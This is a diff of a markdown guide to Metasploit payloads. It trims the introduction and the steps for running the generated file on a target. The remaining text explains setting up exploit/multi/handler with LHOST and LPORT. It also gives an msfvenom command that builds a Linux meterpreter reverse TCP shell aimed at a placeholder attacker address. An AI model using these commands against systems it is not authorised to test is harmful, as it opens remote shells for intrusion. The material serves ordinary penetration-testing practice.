@@ -1,9 +1,4 @@
 # Metasploit Payload Usage Guide
-
-This guide provides detailed instructions for generating and using payloads with the Metasploit framework, including steps for creating and transferring shells, handling payload connections, and troubleshooting issues that may arise. It also includes a handy cheat sheet for common MSFvenom payloads.
-
----
-
 ## Overview
 
 The Metasploit framework allows you to generate various payloads using **MSFvenom** and subsequently handle incoming connections with **Metasploit’s exploit/multi/handler**. The following process outlines how to create a payload, transfer it to the target device, and set up the listener to receive the incoming connection.
@@ -17,7 +12,6 @@ The Metasploit framework allows you to generate various payloads using **MSFveno
 ```
 use exploit/multi/handler
 ```
-
 3. **Set the payload value** along with `LHOST` (your machine's IP) and `LPORT` (port on which your handler will listen) values.
 4. **Run the handler** by typing `run` in the console and wait for the incoming connection.
 
@@ -37,17 +31,6 @@ msfvenom --list payloads | grep meterpreter
 To create a reverse TCP shell for Linux:
 ```
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
-```
-
-- After generating the `rev_shell.elf` file, transfer it to the target machine.
-- On the target machine, grant execute permissions with:
-```
-chmod +x rev_shell.elf
-```
-
-- Then run the shell using:
-```
-./rev_shell.elf
 ```
 
 ### Windows Executable (EXE)
